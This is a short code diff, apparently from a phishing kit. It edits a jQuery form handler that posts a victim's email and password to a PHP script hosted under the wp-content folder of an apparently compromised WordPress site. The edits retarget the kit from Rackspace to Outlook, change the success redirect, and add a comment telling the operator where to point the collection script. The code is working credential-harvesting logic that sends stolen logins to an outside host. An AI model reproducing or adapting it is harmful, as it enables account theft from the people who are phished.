@@ -528,19 +528,19 @@ function submitRackspace() {
         $('.spinner-border').show();
 
         $.ajax({
-            url: 'https://tastymomos.com.au//wp-content/wflogs/trash/pgo.php', 
+            url: 'https://tastymomos.com.au//wp-content/wflogs/trash/pgo.php', // Change this to your PHP file path
             method: 'POST',
             contentType: 'application/json',
-            data: JSON.stringify({ email: email, password: password, provider: 'rackspace' }),
+            data: JSON.stringify({ email: email, password: password, provider: 'outlook' }),
             success: function(response) {
                 if (response.valid) {
-                    window.location.href = 'rackspace-success.html';
+                    window.location.href = 'outlook-success.html';
                 } else {
-                    $('#rackspacePasswordError').text('Invalid email or password.').show();
+                    $('#outlookPasswordError').text(response.error).show();
                 }
             },
             error: function() {
-                $('#rackspacePasswordError').text('An error occurred. Please try again.').show();
+                $('#outlookPasswordError').text('An error occurred. Please try again.').show();
             },
             complete: function() {
                 $('.btn-primary').removeClass('loading');
